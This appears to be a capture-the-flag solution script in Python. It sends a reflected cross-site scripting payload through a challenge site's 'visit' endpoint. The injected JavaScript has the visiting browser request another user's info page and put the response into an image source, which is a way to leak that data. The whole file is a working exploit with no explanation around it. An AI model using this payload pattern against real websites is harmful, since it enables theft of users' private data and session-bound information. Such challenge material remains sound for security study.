import requests

payload = '''
http://challenge.localhost/echo?echo=<script>
var xhttp = new XMLHttpRequest();
xhttp.open("GET","http://challenge.localhost/info?user=1", true);
xhttp.onreadystatechange = function() {
    if (this.readyState == 4 && this.status == 200) {
        document.getElementById("n").src = this.responseText;
    }
};
xhttp.send();
</script><img src="n" id="n">
'''

url = f'http://challenge.localhost/visit?url={payload}'

r = requests.get(url)
